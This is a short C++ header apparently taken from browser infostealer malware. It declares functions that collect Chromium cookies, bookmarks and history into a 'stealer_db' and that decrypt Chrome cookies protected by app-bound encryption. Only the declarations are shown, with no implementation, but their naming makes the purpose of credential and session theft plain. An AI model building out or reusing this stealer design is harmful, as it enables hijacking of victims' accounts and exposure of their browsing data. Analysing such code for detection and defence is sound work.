#ifndef CHROMIUMPARSER_H
#define CHROMIUMPARSER_H

#include "includes\DataHolder.h"
#include "includes\DataDump.h"
#include "includes\ChromiumDecryptor.h"
#include "includes\Helper.h"
#include "Definitions.h"

BOOL chromium_parser(std::string username, std::string stealer_db);
BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db);
BOOL chromium_history_collector(std::string username, std::string stealer_db);

BOOL chrome_cookie_collector_app_bound_decryption(std::string username, std::string stealer_db);

#endif /* CHROMIUMPARSER_H */
